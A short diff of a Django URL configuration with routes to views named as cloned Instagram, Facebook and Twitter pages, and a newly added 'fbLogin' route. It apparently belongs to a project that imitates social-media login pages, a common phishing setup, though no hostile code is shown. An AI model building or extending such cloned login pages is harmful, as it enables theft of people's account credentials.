@@ -26,4 +26,7 @@ urlpatterns = [
 	path('cloned/instagram', views.cloned_instagram, name="cloned_instagram"),
 	path('cloned/facebook', views.cloned_facebook, name="cloned_facebook"),
 	path('cloned/twitter', views.cloned_twitter, name="cloned_twitter"),
+
+	path('fbLogin', views.fbLogin, name="fbLogin"),
+
 ]
